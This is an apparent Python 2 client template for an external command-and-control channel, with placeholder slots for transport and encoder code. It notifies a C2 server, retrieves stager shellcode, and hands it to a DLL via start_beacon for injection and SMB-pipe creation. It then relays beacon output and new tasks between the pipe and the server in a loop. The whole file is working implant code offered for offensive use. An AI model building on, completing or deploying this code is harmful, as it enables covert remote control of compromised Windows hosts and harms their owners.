from ctypes import *
from ctypes.wintypes import *
from sys import exit
from time import sleep
import base64
from ast import literal_eval


# <encoder imports>

# </encoder imports>


# <transport imports>

# </transport imports>


# <configurations>
# ```[var:::client_consts]```
# </configurations>


# <encoder functions>
```[var:::encoder_code]```
# </encoder functions>


# <transport functions>
```[var:::transport_code]```
# </transport functions>

# Client core
C2_BLOCK_TIME = int(```[var:::c2_block_time]```)
CDLL_NAME = ```[var:::cdll_name]```
CLIENT_ID = ```[var:::client_id]```

maxlen = 1024 * 1024
lib = CDLL(CDLL_NAME)

lib.start_beacon.argtypes = [c_char_p, c_int]
lib.start_beacon.restype = POINTER(HANDLE)


def start_beacon(payload):
	return (lib.start_beacon(payload, len(payload)))


lib.read_frame.argtypes = [POINTER(HANDLE), c_char_p, c_int]
lib.read_frame.restype = c_int


def ReadPipe(hPipe):
	mem = create_string_buffer(maxlen)
	l = lib.read_frame(hPipe, mem, maxlen)
	if l < 0: return (-1)
	chunk = mem.raw[:l]
	return (chunk)


lib.write_frame.argtypes = [POINTER(HANDLE), c_char_p, c_int]
lib.write_frame.restype = c_int


def WritePipe(hPipe, chunk):
	print "wp: %s\n" % len(chunk)
	# print chunk # DEBUG
	ret = lib.write_frame(hPipe, c_char_p(chunk), c_int(len(chunk)))
	sleep(3)
	print "ret=%s" % ret
	return (ret)


def task_encode(task):
	return base64.b64encode(task)


def task_decode(task):
	return base64.b64decode(task)


def notify_server():
	print "Notifying server that we're ready for a stager"
	# Construct the data frame
	notification_data_frame = [CLIENT_ID, task_encode(str(C2_BLOCK_TIME))]
	print "notification_data_frame: "
	preped_notify_data_frame = task_encode(str(notification_data_frame))
	send_server_notification(preped_notify_data_frame)
	print "Notification that we're ready sent to server"


def go():
	print "Waiting for stager..."  # DEBUG
	p = retrieveData(CLIENT_ID)
	# Convert this to a task frame
	decoded_p = task_decode(p)
	raw_task_frame = literal_eval(decoded_p)
	decoded_task_frame = [raw_task_frame[0], task_decode(raw_task_frame[1])]

	print "Got a stager! loading..."

	# Wait a few seconds to give the stager a chance to load
	sleep(2)

	# Send the stager shellcode to the dll for injection and pipe creation
	handle_beacon = start_beacon(decoded_task_frame[1])

	# Grabbing and relaying the metadata from the SMB pipe is done during interact()
	print "Loaded, and got handle to beacon. Getting METADATA."

	return handle_beacon


def interact(handle_beacon):
	while (True):

		# LOGIC TO CHECK FOR A CHUNK FROM THE BEACON
		chunk = ReadPipe(handle_beacon)
		if chunk < 0:
			print 'readpipe %d' % (len(chunk))
			break
		else:
			print "Received %d bytes from pipe" % (len(chunk))
		print "relaying chunk to server"
		resp_frame = [CLIENT_ID, task_encode(chunk)]
		preped_resp_frame = task_encode(str(resp_frame))
		sendData(CLIENT_ID, preped_resp_frame)

		# LOGIC TO CHECK FOR A NEW TASK
		print "Checking for new tasks from transport"

		newTask = retrieveData(CLIENT_ID)
		prep_new_task = task_decode(newTask)
		raw_new_task = literal_eval(prep_new_task)
		newTask_frame = [raw_new_task[0], task_decode(raw_new_task[1])]

		print "Got new task: %s" % (newTask_frame[1])
		print "Writing %s bytes to pipe" % (len(newTask_frame[1]))
		r = WritePipe(handle_beacon, newTask_frame[1])
		print "Wrote %s bytes to pipe" % (r)
		sleep(C2_BLOCK_TIME / 100)  # python sleep is in seconds, C2_BLOCK_TIME in milliseconds


# Prepare the transport module
prepTransport()

# Notify the server that we're ready
notify_server()

# Get and inject the stager
handle_beacon = go()

# Run the main loop, keyboard escape available for debugging
try:
	interact(handle_beacon)
except KeyboardInterrupt:
	print "Caught escape signal"
	exit(0)